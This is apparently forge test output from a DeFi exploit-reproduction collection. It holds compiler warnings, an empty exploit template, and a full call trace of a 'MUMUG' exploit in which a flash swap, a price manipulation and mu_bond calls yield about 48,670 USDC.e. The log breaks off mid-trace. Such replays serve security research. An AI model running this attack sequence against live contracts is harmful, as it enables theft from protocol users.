Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.19s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 277.04ms (98.87µs CPU time)

Ran 1 test for src/test/2022-12/MUMUG_exp.sol:ContractTest
[PASS] testExploit() (gas: 617696)
Logs:
  [End] Attacker USDC.e balance after exploit: 48670.713898

Traces:
  [696996] ContractTest::testExploit()
    ├─ [25272] 0xD036414fa2BCBb802691491E323BFf1348C5F4Ba::approve(0x60aE616a2155Ee3d9A68541Ba4544862310933d4, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x60aE616a2155Ee3d9A68541Ba4544862310933d4, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [25295] 0xF7ed17f0Fb2B7C9D3DDBc9F0679b2e1098993e81::approve(0x60aE616a2155Ee3d9A68541Ba4544862310933d4, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x60aE616a2155Ee3d9A68541Ba4544862310933d4, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [25272] 0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664::approve(0x60aE616a2155Ee3d9A68541Ba4544862310933d4, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x60aE616a2155Ee3d9A68541Ba4544862310933d4, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [25272] 0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664::approve(0x4aA679402c6afcE1E0F7Eb99cA4f09a30ce228ab, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x4aA679402c6afcE1E0F7Eb99cA4f09a30ce228ab, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [2864] 0xD036414fa2BCBb802691491E323BFf1348C5F4Ba::balanceOf(0x67d9aAb77BEDA392b1Ed0276e70598bf2A22945d) [staticcall]
    │   └─ ← [Return] 578988936812388669434540 [5.789e23]
    ├─ [448556] 0x67d9aAb77BEDA392b1Ed0276e70598bf2A22945d::swap(578988936812388669434539 [5.789e23], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00)
    │   ├─ [28704] 0xD036414fa2BCBb802691491E323BFf1348C5F4Ba::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 578988936812388669434539 [5.789e23])
    │   │   ├─ emit Transfer(from: 0x67d9aAb77BEDA392b1Ed0276e70598bf2A22945d, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 578988936812388669434539 [5.789e23])
    │   │   └─ ← [Return] true
    │   ├─ [381801] ContractTest::joeCall(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 578988936812388669434539 [5.789e23], 0, 0x00)
    │   │   ├─ [864] 0xD036414fa2BCBb802691491E323BFf1348C5F4Ba::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 578988936812388669434539 [5.789e23]
    │   │   ├─ [91302] 0x60aE616a2155Ee3d9A68541Ba4544862310933d4::swapExactTokensForTokensSupportingFeeOnTransferTokens(578988936812388669434539 [5.789e23], 0, [0xD036414fa2BCBb802691491E323BFf1348C5F4Ba, 0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1670635293 [1.67e9])
    │   │   │   ├─ [11790] 0xD036414fa2BCBb802691491E323BFf1348C5F4Ba::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xfacB3892F9A8D55Eb50fDeee00F2b3fA8a85DED5, 578988936812388669434539 [5.789e23])
    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x60aE616a2155Ee3d9A68541Ba4544862310933d4, value: 115792089237316195423570985008687907853269984665640563460468647195524460205396 [1.157e77])
    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xfacB3892F9A8D55Eb50fDeee00F2b3fA8a85DED5, value: 578988936812388669434539 [5.789e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [2886] 0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   ├─ [2517] 0xfacB3892F9A8D55Eb50fDeee00F2b3fA8a85DED5::getReserves() [staticcall]
    │   │   │   │   └─ ← [Return] 110596398651 [1.105e11], 172739951491310439336991 [1.727e23], 1670632626 [1.67e9]
    │   │   │   ├─ [864] 0xD036414fa2BCBb802691491E323BFf1348C5F4Ba::balanceOf(0xfacB3892F9A8D55Eb50fDeee00F2b3fA8a85DED5) [staticcall]
    │   │   │   │   └─ ← [Return] 751728888303699108771530 [7.517e23]
    │   │   │   ├─ [62293] 0xfacB3892F9A8D55Eb50fDeee00F2b3fA8a85DED5::swap(85123568890 [8.512e10], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   │   │   ├─ [28847] 0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 85123568890 [8.512e10])
    │   │   │   │   │   ├─ emit Transfer(from: 0xfacB3892F9A8D55Eb50fDeee00F2b3fA8a85DED5, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 85123568890 [8.512e10])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [886] 0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664::balanceOf(0xfacB3892F9A8D55Eb50fDeee00F2b3fA8a85DED5) [staticcall]
    │   │   │   │   │   └─ ← [Return] 25472829761 [2.547e10]
    │   │   │   │   ├─ [864] 0xD036414fa2BCBb802691491E323BFf1348C5F4Ba::balanceOf(0xfacB3892F9A8D55Eb50fDeee00F2b3fA8a85DED5) [staticcall]
    │   │   │   │   │   └─ ← [Return] 751728888303699108771530 [7.517e23]
    │   │   │   │   ├─ emit Sync(reserve0: 25472829761 [2.547e10], reserve1: 751728888303699108771530 [7.517e23])
    │   │   │   │   ├─ emit Swap(sender: 0x60aE616a2155Ee3d9A68541Ba4544862310933d4, amount0In: 0, amount1In: 578988936812388669434539 [5.789e23], amount0Out: 85123568890 [8.512e10], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [886] 0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   └─ ← [Return] 85123568890 [8.512e10]
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [149884] 0x4aA679402c6afcE1E0F7Eb99cA4f09a30ce228ab::mu_bond(0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664, 3300000000000000000000 [3.3e21])
    │   │   │   ├─ [366] 0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664::decimals() [staticcall]
    │   │   │   │   └─ ← [Return] 6
    │   │   │   ├─ [886] 0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   └─ ← [Return] 85123568890 [8.512e10]
    │   │   │   ├─ [517] 0xfacB3892F9A8D55Eb50fDeee00F2b3fA8a85DED5::getReserves() [staticcall]
    │   │   │   │   └─ ← [Return] 25472829761 [2.547e10], 751728888303699108771530 [7.517e23], 1670635293 [1.67e9]
    │   │   │   ├─ [1016] 0x60aE616a2155Ee3d9A68541Ba4544862310933d4::getAmountIn(3300000000000000000000 [3.3e21], 751728888303699108771530 [7.517e23], 25472829761000000000000 [2.547e22]) [staticcall]
    │   │   │   │   └─ ← [Return] 112217063304271946101690 [1.122e23]
    │   │   │   ├─ [952] 0x60aE616a2155Ee3d9A68541Ba4544862310933d4::getAmountOut(3300000000000000000000 [3.3e21], 25472829761000000000000 [2.547e22], 751728888303699108771530 [7.517e23]) [staticcall]
    │   │   │   │   └─ ← [Return] 85987875225476076903778 [8.598e22]
    │   │   │   ├─ [2864] 0xD036414fa2BCBb802691491E323BFf1348C5F4Ba::balanceOf(0x4aA679402c6afcE1E0F7Eb99cA4f09a30ce228ab) [staticcall]
    │   │   │   │   └─ ← [Return] 100000000000000000000000 [1e23]
    │   │   │   ├─ [29237] 0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x4aA679402c6afcE1E0F7Eb99cA4f09a30ce228ab, 3300000000 [3.3e9])
    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x4aA679402c6afcE1E0F7Eb99cA4f09a30ce228ab, value: 3300000000 [3.3e9])
    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x4aA679402c6afcE1E0F7Eb99cA4f09a30ce228ab, value: 115792089237316195423570985008687907853269984665640564039457584007909829639935 [1.157e77])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [26704] 0xD036414fa2BCBb802691491E323BFf1348C5F4Ba::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99102469264874011502734 [9.91e22])
    │   │   │   │   ├─ emit Transfer(from: 0x4aA679402c6afcE1E0F7Eb99cA4f09a30ce228ab, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 99102469264874011502734 [9.91e22])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [59346] 0x1713BCAF63fd615F4FDe8D025326CE0948EBCCdB::mint(0x4aA679402c6afcE1E0F7Eb99cA4f09a30ce228ab, 3300000000000000000000 [3.3e21])
    │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x4aA679402c6afcE1E0F7Eb99cA4f09a30ce228ab, value: 3300000000000000000000 [3.3e21])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [87112] 0x4aA679402c6afcE1E0F7Eb99cA4f09a30ce228ab::mu_gold_bond(0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664, 6990000000000000000000 [6.99e21])
    │   │   │   ├─ [366] 0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664::decimals() [staticcall]
    │   │   │   │   └─ ← [Return] 6
    │   │   │   ├─ [886] 0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   └─ ← [Return] 81823568890 [8.182e10]
    │   │   │   ├─ [517] 0xfacB3892F9A8D55Eb50fDeee00F2b3fA8a85DED5::getReserves() [staticcall]
    │   │   │   │   └─ ← [Return] 25472829761 [2.547e10], 751728888303699108771530 [7.517e23], 1670635293 [1.67e9]
    │   │   │   ├─ [1016] 0x60aE616a2155Ee3d9A68541Ba4544862310933d4::getAmountIn(6990000000000000000000 [6.99e21], 751728888303699108771530 [7.517e23], 25472829761000000000000 [2.547e22]) [staticcall]
    │   │   │   │   └─ ← [Return] 285150931201916387191532 [2.851e23]
    │   │   │   ├─ [952] 0x60aE616a2155Ee3d9A68541Ba4544862310933d4::getAmountOut(6990000000000000000000 [6.99e21], 25472829761000000000000 [2.547e22], 751728888303699108771530 [7.517e23]) [staticcall]
    │   │   │   │   └─ ← [Return] 161483380208460799406205 [1.614e23]
    │   │   │   ├─ [517] 0x67d9aAb77BEDA392b1Ed0276e70598bf2A22945d::getReserves() [staticcall]
    │   │   │   │   └─ ← [Return] 578988936812388669434540 [5.789e23], 21245679866455508698123 [2.124e22], 1670634961 [1.67e9]
    │   │   │   ├─ [952] 0x60aE616a2155Ee3d9A68541Ba4544862310933d4::getAmountOut(161483380208460799406205 [1.614e23], 578988936812388669434540 [5.789e23], 21245679866455508698123 [2.124e22]) [staticcall]
    │   │   │   │   └─ ← [Return] 4622415961337300468163 [4.622e21]
    │   │   │   ├─ [1016] 0x60aE616a2155Ee3d9A68541Ba4544862310933d4::getAmountIn(223317155705188593298868 [2.233e23], 21245679866455508698123 [2.124e22], 578988936812388669434540 [5.789e23]) [staticcall]
    │   │   │   │   └─ ← [Return] 13379754749148191986237 [1.337e22]
    │   │   │   ├─ [952] 0x60aE616a2155Ee3d9A68541Ba4544862310933d4::getAmountOut(223317155705188593298868 [2.233e23], 578988936812388669434540 [5.789e23], 21245679866455508698123 [2.124e22]) [staticcall]
    │   │   │   │   └─ ← [Return] 5900795862577846969774 [5.9e21]
    │   │   │   ├─ [2930] 0xF7ed17f0Fb2B7C9D3DDBc9F0679b2e1098993e81::balanceOf(0x4aA679402c6afcE1E0F7Eb99cA4f09a30ce228ab) [staticcall]
    │   │   │   │   └─ ← [Return] 10000000000000000000000 [1e22]
    │   │   │   ├─ [7337] 0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x4aA679402c6afcE1E0F7Eb99cA4f09a30ce228ab, 6990000000 [6.99e9])
    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x4aA679402c6afcE1E0F7Eb99cA4f09a30ce228ab, value: 6990000000 [6.99e9])
    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x4aA679402c6afcE1E0F7Eb99cA4f09a30ce228ab, value: 115792089237316195423570985008687907853269984665640564039457584007902839639935 [1.157e77])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [41205] 0xF7ed17f0Fb2B7C9D3DDBc9F0679b2e1098993e81::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 9640275305863019478005 [9.64e21])
    │   │   │   │   ├─ emit Transfer(from: 0x4aA679402c6afcE1E0F7Eb99cA4f09a30ce228ab, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 9640275305863019478005 [9.64e21])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [5546] 0x1713BCAF63fd615F4FDe8D025326CE0948EBCCdB::mint(0x4aA679402c6afcE1E0F7Eb99cA4f09a30ce228ab, 6990000000000000000000 [6.99e21])
    │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x4aA679402c6afcE1E0F7Eb99cA4f09a30ce228ab, value: 6990000000000000000000 [6.99e21])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [886] 0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 74833568890 [7.483e10]
    │   │   ├─ [36074] 0x60aE616a2155Ee3d9A68541Ba4544862310933d4::swapExactTokensForTokensSupportingFeeOnTransferTokens(74833568890 [7.483e10], 0, [0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664, 0xD036414fa2BCBb802691491E323BFf1348C5F4Ba], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1670635293 [1.67e9])
    │   │   │   ├─ [7337] 0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xfacB3892F9A8D55Eb50fDeee00F2b3fA8a85DED5, 74833568890 [7.483e10])
    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xfacB3892F9A8D55Eb50fDeee00F2b3fA8a85DED5, value: 74833568890 [7.483e10])
    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x60aE616a2155Ee3d9A68541Ba4544862310933d4, value: 115792089237316195423570985008687907853269984665640564039457584007838296071045 [1.157e77])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [864] 0xD036414fa2BCBb802691491E323BFf1348C5F4Ba::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   └─ ← [Return] 99102469264874011502734 [9.91e22]
    │   │   │   ├─ [517] 0xfacB3892F9A8D55Eb50fDeee00F2b3fA8a85DED5::getReserves() [staticcall]
    │   │   │   │   └─ ← [Return] 25472829761 [2.547e10], 751728888303699108771530 [7.517e23], 1670635293 [1.67e9]
    │   │   │   ├─ [886] 0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664::balanceOf(0xfacB3892F9A8D55Eb50fDeee00F2b3fA8a85DED5) [staticcall]
    │   │   │   │   └─ ← [Return] 100306398651 [1.003e11]
    │   │   │   ├─ [18090] 0xfacB3892F9A8D55Eb50fDeee00F2b3fA8a85DED5::swap(0, 560398963597062865994409 [5.603e23], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   │   │   ├─ [4004] 0xD036414fa2BCBb802691491E323BFf1348C5F4Ba::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 560398963597062865994409 [5.603e23])
    │   │   │   │   │   ├─ emit Transfer(from: 0xfacB3892F9A8D55Eb50fDeee00F2b3fA8a85DED5, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 560398963597062865994409 [5.603e23])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [886] 0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664::balanceOf(0xfacB3892F9A8D55Eb50fDeee00F2b3fA8a85DED5) [staticcall]
    │   │   │   │   │   └─ ← [Return] 100306398651 [1.003e11]
    │   │   │   │   ├─ [864] 0xD036414fa2BCBb802691491E323BFf1348C5F4Ba::balanceOf(0xfacB3892F9A8D55Eb50fDeee00F2b3fA8a85DED5) [staticcall]
    │   │   │   │   │   └─ ← [Return] 191329924706636242777121 [1.913e23]
    │   │   │   │   ├─ emit Sync(reserve0: 100306398651 [1.003e11], reserve1: 191329924706636242777121 [1.913e23])
    │   │   │   │   ├─ emit Swap(sender: 0x60aE616a2155Ee3d9A68541Ba4544862310933d4, amount0In: 74833568890 [7.483e10], amount1In: 0, amount0Out: 0, amount1Out: 560398963597062865994409 [5.603e23], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [864] 0xD036414fa2BCBb802691491E323BFf1348C5F4Ba::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   └─ ← [Return] 659501432861936877497143 [6.595e23]
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [4004] 0xD036414fa2BCBb802691491E323BFf1348C5F4Ba::transfer(0x67d9aAb77BEDA392b1Ed0276e70598bf2A22945d, 580731130202997662422804 [5.807e23])
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x67d9aAb77BEDA392b1Ed0276e70598bf2A22945d, value: 580731130202997662422804 [5.807e23])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop] 
    │   ├─ [864] 0xD036414fa2BCBb802691491E323BFf1348C5F4Ba::balanceOf(0x67d9aAb77BEDA392b1Ed0276e70598bf2A22945d) [staticcall]
    │   │   └─ ← [Return] 580731130202997662422805 [5.807e23]
    │   ├─ [2930] 0xF7ed17f0Fb2B7C9D3DDBc9F0679b2e1098993e81::balanceOf(0x67d9aAb77BEDA392b1Ed0276e70598bf2A22945d) [staticcall]
    │   │   └─ ← [Return] 21245679866455508698123 [2.124e22]
    │   ├─ emit Sync(reserve0: 580731130202997662422805 [5.807e23], reserve1: 21245679866455508698123 [2.124e22])
    │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 580731130202997662422804 [5.807e23], amount1In: 0, amount0Out: 578988936812388669434539 [5.789e23], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   └─ ← [Stop] 
    ├─ [930] 0xF7ed17f0Fb2B7C9D3DDBc9F0679b2e1098993e81::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 9640275305863019478005 [9.64e21]
    ├─ [89110] 0x60aE616a2155Ee3d9A68541Ba4544862310933d4::swapExactTokensForTokensSupportingFeeOnTransferTokens(9640275305863019478005 [9.64e21], 0, [0xF7ed17f0Fb2B7C9D3DDBc9F0679b2e1098993e81, 0xD036414fa2BCBb802691491E323BFf1348C5F4Ba, 0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1670635293 [1.67e9])
    │   ├─ [16224] 0xF7ed17f0Fb2B7C9D3DDBc9F0679b2e1098993e81::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x67d9aAb77BEDA392b1Ed0276e70598bf2A22945d, 9640275305863019478005 [9.64e21])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x67d9aAb77BEDA392b1Ed0276e70598bf2A22945d, value: 9640275305863019478005 [9.64e21])
    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x60aE616a2155Ee3d9A68541Ba4544862310933d4, value: 115792089237316195423570985008687907853269984665640564029817308702050110161930 [1.157e77])
    │   │   └─ ← [Return] true
    │   ├─ [886] 0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [517] 0x67d9aAb77BEDA392b1Ed0276e70598bf2A22945d::getReserves() [staticcall]
    │   │   └─ ← [Return] 580731130202997662422805 [5.807e23], 21245679866455508698123 [2.124e22], 1670635293 [1.67e9]
    │   ├─ [930] 0xF7ed17f0Fb2B7C9D3DDBc9F0679b2e1098993e81::balanceOf(0x67d9aAb77BEDA392b1Ed0276e70598bf2A22945d) [staticcall]
    │   │   └─ ← [Return] 30885955172318528176128 [3.088e22]
    │   ├─ [18134] 0x67d9aAb77BEDA392b1Ed0276e70598bf2A22945d::swap(180886234472865834842570 [1.808e23], 0, 0xfacB3892F9A8D55Eb50fDeee00F2b3fA8a85DED5, 0x)
    │   │   ├─ [4004] 0xD036414fa2BCBb802691491E323BFf1348C5F4Ba::transfer(0xfacB3892F9A8D55Eb50fDeee00F2b3fA8a85DED5, 180886234472865834842570 [1.808e23])
    │   │   │   ├─ emit Transfer(from: 0x67d9aAb77BEDA392b1Ed0276e70598bf2A22945d, to: 0xfacB3892F9A8D55Eb50fDeee00F2b3fA8a85DED5, value: 180886234472865834842570 [1.808e23])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [864] 0xD036414fa2BCBb802691491E323BFf1348C5F4Ba::balanceOf(0x67d9aAb77BEDA392b1Ed0276e70598bf2A22945d) [staticcall]
    │   │   │   └─ ← [Return] 399844895730131827580235 [3.998e23]
    │   │   ├─ [930] 0xF7ed17f0Fb2B7C9D3DDBc9F0679b2e1098993e81::balanceOf(0x67d9aAb77BEDA392b1Ed0276e70598bf2A22945d) [staticcall]
    │   │   │   └─ ← [Return] 30885955172318528176128 [3.088e22]
    │   │   ├─ emit Sync(reserve0: 399844895730131827580235 [3.998e23], reserve1: 30885955172318528176128 [3.088e22])
    │   │   ├─ emit Swap(sender: 0x60aE616a2155Ee3d9A68541Ba4544862310933d4, amount0In: 0, amount1In: 9640275305863019478005 [9.64e21], amount0Out: 180886234472865834842570 [1.808e23], amount1Out: 0, to: 0xfacB3892F9A8D55Eb50fDeee00F2b3fA8a85DED5)
    │   │   └─ ← [Stop] 
    │   ├─ [517] 0xfacB3892F9A8D55Eb50fDeee00F2b3fA8a85DED5::getReserves() [staticcall]
    │   │   └─ ← [Return] 100306398651 [1.003e11], 191329924706636242777121 [1.913e23], 1670635293 [1.67e9]
    │   ├─ [864] 0xD036414fa2BCBb802691491E323BFf1348C5F4Ba::balanceOf(0xfacB3892F9A8D55Eb50fDeee00F2b3fA8a85DED5) [staticcall]
    │   │   └─ ← [Return] 372216159179502077619691 [3.722e23]
    │   ├─ [38133] 0xfacB3892F9A8D55Eb50fDeee00F2b3fA8a85DED5::swap(48670713898 [4.867e10], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   ├─ [24047] 0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 48670713898 [4.867e10])
    │   │   │   ├─ emit Transfer(from: 0xfacB3892F9A8D55Eb50fDeee00F2b3fA8a85DED5, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 48670713898 [4.867e10])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [886] 0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664::balanceOf(0xfacB3892F9A8D55Eb50fDeee00F2b3fA8a85DED5) [staticcall]
    │   │   │   └─ ← [Return] 51635684753 [5.163e10]
    │   │   ├─ [864] 0xD036414fa2BCBb802691491E323BFf1348C5F4Ba::balanceOf(0xfacB3892F9A8D55Eb50fDeee00F2b3fA8a85DED5) [staticcall]
    │   │   │   └─ ← [Return] 372216159179502077619691 [3.722e23]
    │   │   ├─ emit Sync(reserve0: 51635684753 [5.163e10], reserve1: 372216159179502077619691 [3.722e23])
